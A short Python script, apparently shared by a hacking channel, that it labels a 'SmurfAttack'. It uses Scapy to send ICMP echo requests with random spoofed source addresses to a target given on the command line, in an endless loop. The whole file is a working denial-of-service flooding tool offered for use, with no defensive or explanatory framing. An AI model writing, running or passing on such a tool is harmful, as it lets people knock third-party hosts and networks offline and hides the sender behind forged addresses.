#! /usr/bin/env python3
# Channel RemaxBoxTeam
# lhashashinl <--M-->

from scapy.all import *
from scapy import *
from scapy import route
import socket,sys

nill = 0

def SmurfAttack(Target,message):
    if(nill != 1):
        print("\033[94;3m Start Attack ...")
        ipm = RandIP()
        icmp = ICMP(type=8,code=0)
        ip = IP(src=ipm,dst=Target,version=4,ttl=99,id=1)
        pyload = ip/icmp/message  
        i=0
        while True:  
            send(pyload,verbose=0)
            i+=1
            print(f"\033[41m PACKET \033[0m send SmurfAttack \033[31m{Target}\033[0m count \033[31m{i}\033[0m")


    

SmurfAttack(Target=sys.argv[1],message=sys.argv[2])